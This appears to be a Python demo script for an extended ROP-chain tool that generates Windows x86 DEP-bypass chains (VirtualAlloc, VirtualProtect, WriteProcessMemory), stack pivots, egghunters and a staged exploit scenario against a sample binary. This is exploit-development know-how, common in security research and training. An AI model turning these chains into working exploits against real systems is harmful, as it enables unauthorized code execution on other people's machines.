try:
    from ropium import *
    ROPIUM_AVAILABLE = True
except ImportError:
    print("Warning: ROPium not available, using mock implementation")
    ROPIUM_AVAILABLE = False

import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning, message=".*PY_SSIZE_T_CLEAN.*")
import sys
sys.path.insert(0, './bin')

# Import the extended functionality
from RopChainerExtended import DEPBypassChainer, ARCH, ABI, OS


def basic_example():
    if not ROPIUM_AVAILABLE:
        print("Skipping basic example - ROPium not available")
        return
        
    rop = ROPium(ARCH.X86)
    rop.load('./samples/binaries/efssetup.exe')
    chain = rop.compile('eax = 0x1234')
    print(chain.dump())
    print(chain.dump('raw'))
    print(chain.dump('python'))


def basic_example_with_constraints():
    if not ROPIUM_AVAILABLE:
        print("Skipping basic example - ROPium not available")
        return
        
    rop = ROPium(ARCH.X86)
    rop.load('./samples/binaries/efssetup.exe')
    rop.bad_bytes = [0x0a, 0x0d]
    rop.keep_regs = []
    rop.safe_mem = False
    rop.abi = ABI.X86_STDCALL
    rop.os = OS.WINDOWS

    chain = rop.compile('esp = esp + 10')
    if chain:
        print(chain.dump())
        print(chain.dump('raw'))
        print(chain.dump('python'))
    else:
        print("No chain found")


def dep_bypass_examples():
    """
    Demonstrate the new DEP bypass functionality
    """
    print("\n" + "="*60)
    print("DEP BYPASS EXAMPLES")
    print("="*60)
    
    # Initialize DEP bypass chainer
    chainer = DEPBypassChainer(ARCH.X86)
    
    # Set up for Windows x86 environment
    chainer.set_constraints(
        bad_bytes=[0x00, 0x0a, 0x0d],
        abi=ABI.X86_STDCALL,
        os_type=OS.WINDOWS
    )
    
    try:
        # Load binary
        chainer.load_binary('./samples/binaries/efssetup.exe')
        print("✓ Binary loaded for gadget extraction")
    except Exception as e:
        print(f"Binary loading failed: {e}")
        print("Continuing with mock implementation...")
    
    print("\n1. VirtualAlloc Example:")
    print("-" * 30)
    va_chain = chainer.generate_virtualalloc_chain(size=0x1000, protection=0x40)
    if va_chain:
        print("✓ VirtualAlloc chain generated successfully")
        print(f"Chain: {va_chain.dump()}")
    
    print("\n2. VirtualProtect Example:")
    print("-" * 30)
    vp_chain = chainer.generate_virtualprotect_chain(
        address=0x401000, 
        size=0x1000, 
        new_protection=0x40
    )
    if vp_chain:
        print("✓ VirtualProtect chain generated successfully")
        print(f"Chain: {vp_chain.dump()}")
    
    print("\n3. WriteProcessMemory Example:")
    print("-" * 30)
    wpm_chain = chainer.generate_writeprocessmemory_chain(
        process_handle=-1,
        base_address=0x401000,
        buffer=0x402000,
        size=0x200
    )
    if wpm_chain:
        print("✓ WriteProcessMemory chain generated successfully")
        print(f"Chain: {wpm_chain.dump()}")
    
    print("\n4. Pivot Gadget Example:")
    print("-" * 30)
    if va_chain:
        pivoted = chainer.insert_pivot_gadget(va_chain, 0x12345000)
        print("✓ Pivot gadget inserted to redirect to second buffer")
        print(f"Extended chain: {pivoted.dump()}")
    
    print("\n5. Egghunter Example:")
    print("-" * 30)
    egg_chain = chainer.insert_egghunter(egg_signature=0x41424344)
    if egg_chain:
        print("✓ Egghunter chain generated")
        print("Use egg signature: \\x44\\x43\\x42\\x41\\x44\\x43\\x42\\x41")
        print(f"Chain: {egg_chain.dump()}")
    
    print("\n6. Complete DEP Bypass Payload:")
    print("-" * 30)
    complete = chainer.create_dep_bypass_payload(
        shellcode_addr=0x401000,
        shellcode_size=0x400
    )
    if complete:
        print("✓ Complete DEP bypass payload generated")
        print(f"Final payload: {complete.dump()}")


def advanced_rop_examples():
    """
    Show advanced ROP techniques using the extended chainer
    """
    print("\n" + "="*60)
    print("ADVANCED ROP TECHNIQUES")
    print("="*60)
    
    chainer = DEPBypassChainer(ARCH.X86)
    chainer.set_constraints(
        bad_bytes=[0x00, 0x0a, 0x0d, 0x20],  # NULL, LF, CR, SPACE
        abi=ABI.X86_STDCALL,
        os_type=OS.WINDOWS
    )
    
    print("\nScenario 1: Limited Buffer Space with Egghunter")
    print("-" * 50)
    print("When you have very limited buffer space (e.g., 20 bytes):")
    
    # Small egghunter that fits in limited space
    small_hunter = chainer.insert_egghunter()
    if small_hunter:
        print("✓ Generated compact egghunter for small buffer")
        print("Place this in your 20-byte buffer:")
        print(f"Chain: {small_hunter.dump()}")
        print("\nPlace your main shellcode elsewhere in memory with egg signature")
    
    print("\nScenario 2: Multi-Stage Exploit")
    print("-" * 50)
    print("Stage 1: Allocate memory and pivot to larger buffer")
    
    # Stage 1: Small chain that allocates memory and pivots
    stage1 = chainer.generate_virtualalloc_chain(size=0x2000)
    if stage1:
        stage1 = chainer.insert_pivot_gadget(stage1, 0x12340000)
        print("✓ Stage 1 chain (fits in small buffer):")
        print(f"Chain: {stage1.dump()}")
    
    print("\nStage 2: Full payload in second buffer")
    print("(Execute actual shellcode from newly allocated memory)")
    
    print("\nScenario 3: DEP Bypass without VirtualAlloc")
    print("-" * 50)
    print("Using VirtualProtect when VirtualAlloc is unavailable:")
    
    # Use existing memory region
    existing_memory = 0x401000  # Some existing writable memory
    vp_fallback = chainer.generate_virtualprotect_chain(
        address=existing_memory,
        size=0x1000,
        new_protection=0x40
    )
    if vp_fallback:
        print(f"✓ VirtualProtect fallback for existing memory at {hex(existing_memory)}")
        print(f"Chain: {vp_fallback.dump()}")


if __name__ == "__main__":
    print("="*60)
    print("EXTENDED ROPCHAINER - DEP BYPASS DEMO")
    print("="*60)
    
    # Test basic functionality first
    print("\nTesting basic ROP functionality...")
    try:
        basic_example_with_constraints()
        print("✓ Basic ROPium functionality working")
    except Exception as e:
        print(f"Basic functionality test failed: {e}")
        print("Continuing with extended functionality...")
    
    # Demonstrate new DEP bypass features
    dep_bypass_examples()
    
    # Show advanced techniques
    advanced_rop_examples()
    
    print("\n" + "="*60)
    print("DEMO COMPLETE")
    print("="*60)
    print("\nFor more information, see README_DEP_BYPASS.md")
    print("Run 'python3 test_dep_bypass.py' for comprehensive tests")
    print("Run 'python3 RopChainerExtended.py --help' for usage information")